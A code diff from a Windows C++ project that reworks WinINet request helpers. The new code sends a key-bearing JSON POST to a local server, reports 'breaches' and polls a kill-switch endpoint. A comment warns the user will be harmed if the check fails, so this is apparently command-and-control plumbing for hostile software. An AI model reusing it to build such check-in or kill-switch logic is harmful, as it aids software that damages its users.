@@ -1,21 +1,18 @@
-#include <windows.h>
-#include <WinInet.h>
-#include <corecrt_wstdlib.h>
-#include <stdlib.h>
-
-#include <iostream>
-#include <string>
-#include <iterator>
-
-#pragma comment (lib, "Wininet.lib")
-
 #include "utils.h"
 
 #define BUFSIZE 512
+#define KILL_ENDPOINT L"/api/can-kms"
+#define USER_AGENT L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36"
+#define SERVER_NAME L"127.0.0.1"
+#define SERVER_PORT 5000
 
-// RCDO_USERAGENT
-// RCDO_SERVERNAME
-// RCDO_SERVERPORT
+std::wstring key;
+
+bool checkRCDOKey(){
+    key = getEnvVar(L"RCDO_KEY", L"");
+    return !key.empty();
+}
+
 std::wstring getEnvVar(const wchar_t * envVarName, const wchar_t * defaultValue){
     std::wstring returnVal(defaultValue);
 
@@ -38,18 +35,69 @@ std::wstring getEnvVar(const wchar_t * envVarName, const wchar_t * defaultValue)
     return returnVal;
 }
 
-std::string readFromServer(){
-    std::wstring RCDO_USERAGENT = getEnvVar(L"RCDO_USERAGENT", L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36");
-    std::wstring RCDO_SERVERNAME = getEnvVar(L"RCDO_SERVERNAME", L"127.0.0.1");
-    int RCDO_SERVERPORT = stoi(getEnvVar(L"RCDO_SERVERPORT", L"80"));
-    std::wstring RCDO_ENDPOINT = getEnvVar(L"RCDO_ENDPOINT", L"/api/cankillmyself.html");
+/* Returns:
+ *      true: success
+ *      false: failure
+ */
+void addKeyToRequestBody(std::map<std::wstring,std::wstring>*& input){
+    if(input == NULL){
+        input = new std::map<std::wstring, std::wstring>();
+    }
 
-    HINTERNET hInternet = InternetOpenW(RCDO_USERAGENT.c_str(),INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
-    HINTERNET hConnect = InternetConnectW(hInternet, RCDO_SERVERNAME.c_str(), RCDO_SERVERPORT, NULL,NULL,INTERNET_SERVICE_HTTP,0,0);
+    if(key.empty()){
+        return;
+    }
+    (*input)[L"key"] = key;
+}
+
+std::string mapToJsonString(std::map<std::wstring,std::wstring> input){
+    std::map<std::wstring, std::wstring>::iterator it;
+
+    std::wstring output = L"{";
+    for (it = input.begin(); it != input.end(); it++){
+        output += L"\"" + it->first + L"\":";
+        output += L"\"" + it->second + L"\",";
+    }
+    output.pop_back();
+    output += L"}";
+    return std::string(output.begin(), output.end());
+}
+
+/*
+ * Notifies the web server that a breach has occured
+ */
+void notify(std::wstring data){
+    std::wstring notifyEndpoint = L"/api/report/breach";
+
+    std::map<std::wstring, std::wstring> requestBody;
+    requestBody[L"msg"] = data;
+    std::string out = sendRequest(L"POST", notifyEndpoint, &requestBody);
+}
+
+/*
+ * Examples
+ * verb (string): GET/POST
+ * endpoint (string): /api/something
+ * requestBody (JSON string): {"key": "msg"}
+ */
+std::string sendRequest(std::wstring verb, std::wstring endpoint,
+        std::map<std::wstring,std::wstring>* requestBody){
+    // Setup
+    addKeyToRequestBody(requestBody);
+    std::string szRequestBody = mapToJsonString(*requestBody);
+
+    HINTERNET hInternet = InternetOpenW(USER_AGENT,
+            INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0);
+    HINTERNET hConnect = InternetConnectW(hInternet, SERVER_NAME,
+            SERVER_PORT, NULL,NULL,INTERNET_SERVICE_HTTP,0,0);
 
     // GET Request
-    HINTERNET hHttpFile = HttpOpenRequestW(hConnect, NULL, RCDO_ENDPOINT.c_str(),NULL,NULL,NULL,INTERNET_FLAG_DONT_CACHE|INTERNET_FLAG_NO_CACHE_WRITE,0);
-    if (!HttpSendRequestW(hHttpFile, NULL, 0, 0, 0)){
+    HINTERNET hHttpFile = HttpOpenRequestW(hConnect, verb.c_str(), endpoint.c_str(),
+            NULL,NULL,NULL,INTERNET_FLAG_DONT_CACHE|INTERNET_FLAG_NO_CACHE_WRITE,0);
+
+    std::wstring headers = L"Content-Type: application/json";
+    if (!HttpSendRequestW(hHttpFile, headers.c_str(), headers.size(),
+            (LPVOID)szRequestBody.c_str(), szRequestBody.size())){
         std::wcout << L"HttpSendRequest Failed" << std::endl;
         std::wcout << GetLastError() << std::endl;
         return "";
@@ -57,7 +105,9 @@ std::string readFromServer(){
 
     DWORD contentlen = 0;
     DWORD size_f = sizeof(contentlen);
-    if(!(HttpQueryInfoW(hHttpFile, HTTP_QUERY_CONTENT_LENGTH|HTTP_QUERY_FLAG_NUMBER, &contentlen, &size_f, NULL) && contentlen > 0)) {
+    if(!(HttpQueryInfoW(hHttpFile,
+            HTTP_QUERY_CONTENT_LENGTH|HTTP_QUERY_FLAG_NUMBER, &contentlen,
+            &size_f, NULL) && contentlen > 0)) {
         std::wcout << L"HttpQueryInfo Failed" << std::endl;
         std::wcout << GetLastError() << std::endl;
         return "";
@@ -104,13 +154,13 @@ void pollKillSwitch(){
     // seocnds, if not the user gonna be fucked.
     int isFirstLoop = 1;
     for(;;) {
-        std::string content = readFromServer();
+        std::string content = sendRequest(L"POST", KILL_ENDPOINT, NULL);
         if(content.empty() && isFirstLoop){
             Sleep(5000);
             return;
         }
 
-        if (content.compare(0,4,"TRUE") == 0){
+        if (content.compare(0,4,"true") == 0){
             return;
         }
 
